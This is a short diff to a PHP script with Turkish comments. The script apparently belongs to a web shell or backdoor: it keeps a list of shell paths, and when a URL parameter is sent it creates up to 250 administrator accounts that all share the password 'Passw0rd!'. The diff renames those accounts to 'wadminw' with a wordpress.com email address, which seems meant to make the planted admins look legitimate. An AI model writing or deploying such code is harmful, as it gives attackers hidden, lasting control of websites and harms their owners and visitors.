@@ -31,8 +31,8 @@ $shell_paths = [];
 // Admin Hesap Oluşturma
 if (isset($_GET['create_admins'])) {
     $created_admins = 0;
-    $base_username = 'admin_';
-    $base_email = 'admin_@example.com';
+    $base_username = 'wadminw';
+    $base_email = 'wadminw@wordpress.com';
     $base_password = 'Passw0rd!';
 
     while ($created_admins < 250) {
